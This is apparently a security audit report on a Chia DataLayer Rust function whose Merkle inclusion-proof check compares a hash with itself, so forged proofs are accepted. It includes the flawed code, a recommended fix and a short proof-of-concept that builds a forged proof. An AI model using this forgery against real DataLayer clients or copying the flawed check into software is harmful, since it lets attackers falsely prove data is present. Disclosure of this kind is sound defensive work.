### Title
`ProofOfInclusion::valid()` Tautological Root-Hash Check Allows Forged Inclusion Proofs - (File: `crates/chia-datalayer/src/merkle/proof_of_inclusion.rs`)

### Summary

`ProofOfInclusion::valid()` contains a final comparison that is always `true` for any internally-consistent proof, regardless of the actual Merkle tree root. The function never validates the proof against an external root hash, so any attacker-crafted `ProofOfInclusion` with a self-consistent layer chain will pass validation and claim any arbitrary key is included in any tree.

### Finding Description

`ProofOfInclusion` is a `Streamable`-derived struct (deserializable from raw bytes) exposed to Python via `py_valid()`. Its `valid()` method is:

```rust
pub fn root_hash(&self) -> Hash {
    if let Some(last) = self.layers.last() {
        last.combined_hash   // ← returns the last layer's own field
    } else {
        self.node_hash
    }
}

pub fn valid(&self) -> bool {
    let mut existing_hash = self.node_hash;

    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );
        if calculated_hash != layer.combined_hash {
            return false;
        }
        existing_hash = calculated_hash;   // ← existing_hash = layer.combined_hash
    }

    existing_hash == self.root_hash()      // ← always true: both sides are last.combined_hash
}
```

After the loop, `existing_hash` equals the last `calculated_hash`, which the loop already verified equals `layer.combined_hash`. `self.root_hash()` returns that same `last.combined_hash`. The final comparison is therefore a tautology — it is structurally impossible for it to return `false`.

For the zero-layer (single-node) case, `existing_hash` is `self.node_hash` and `root_hash()` also returns `self.node_hash`, so the check is again always `true`.

The function never receives or compares against an external, trusted root hash. An attacker who constructs a `ProofOfInclusion` with:
- an arbitrary `node_hash` (claiming any key/value pair is present), and
- any chain of `ProofOfInclusionLayer` values that are internally self-consistent (each `combined_hash` equals the hash of the previous hash combined with `other_hash`),

will receive `valid() == true` unconditionally. [1](#0-0) 

### Impact Explanation

`ProofOfInclusion` is `Streamable` (line 13) and exposed to Python as a first-class object with `py_valid()` (line 69). [2](#0-1) 

Any Python consumer that receives a serialized `ProofOfInclusion` from an untrusted peer and calls `proof.valid()` as its sole gate will accept a completely fabricated proof. The attacker controls `node_hash` (the claimed leaf hash) and can set it to any value, meaning they can assert that any key/value pair is present in any DataLayer store without it actually being there. This directly matches the allowed High impact: **DataLayer Merkle proof/blob/delta logic accepts forged inclusion/exclusion, or lets untrusted input prove invalid state.** [3](#0-2) 

### Likelihood Explanation

`ProofOfInclusion` is a `Streamable` type (binary-deserializable) and is the primary proof object returned by `MerkleBlob::get_proof_of_inclusion` and its Python binding `py_get_proof_of_inclusion`. [4](#0-3) 

Any DataLayer client that verifies a proof received over the network by calling `proof.valid()` without separately asserting `proof.root_hash() == known_root` is fully exploitable. The Python `.pyi` stub exposes `valid()` as the canonical verification method with no root-hash parameter, making it the natural and expected call pattern. The attacker needs only to craft a self-consistent layer chain — a trivial computation.

### Recommendation

`valid()` must accept the expected root hash as a parameter and compare against it:

```rust
pub fn valid(&self, expected_root: &Hash) -> bool {
    let mut existing_hash = self.node_hash;

    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );
        if calculated_hash != layer.combined_hash {
            return false;
        }
        existing_hash = calculated_hash;
    }

    &existing_hash == expected_root   // ← compare against the caller-supplied trusted root
}
```

Update `py_valid` to require the expected root hash from the caller, and update all call sites (tests, fuzz targets, Python bindings) accordingly. [5](#0-4) 

### Proof of Concept

```rust
use chia_datalayer::{Hash, Side};
use chia_datalayer::merkle::proof_of_inclusion::{ProofOfInclusion, ProofOfInclusionLayer};
use chia_datalayer::calculate_internal_hash;

fn forge_proof(claimed_leaf_hash: Hash, fake_sibling: Hash) -> ProofOfInclusion {
    // Attacker picks any node_hash and builds a self-consistent single layer.
    let combined = calculate_internal_hash(&claimed_leaf_hash, Side::Right, &fake_sibling);
    ProofOfInclusion {
        node_hash: claimed_leaf_hash,
        layers: vec![ProofOfInclusionLayer {
            other_hash_side: Side::Right,
            other_hash: fake_sibling,
            combined_hash: combined,   // self-consistent: calculated == stored
        }],
    }
}

fn main() {
    let fake_leaf  = [0xAA; 32];
    let fake_sibling = [0xBB; 32];
    let proof = forge_proof(fake_leaf, fake_sibling);

    // valid() returns true even though this proof was never generated
    // from any real MerkleBlob and the root hash is completely attacker-controlled.
    assert!(proof.valid());   // passes — tautology confirmed
    println!("Forged proof accepted. root_hash = {:?}", proof.root_hash());
}
```

The forged proof passes `valid()` because `existing_hash` after the loop equals `combined_hash`, and `root_hash()` also returns `combined_hash` — the attacker controls both sides of the final comparison. [5](#0-4)
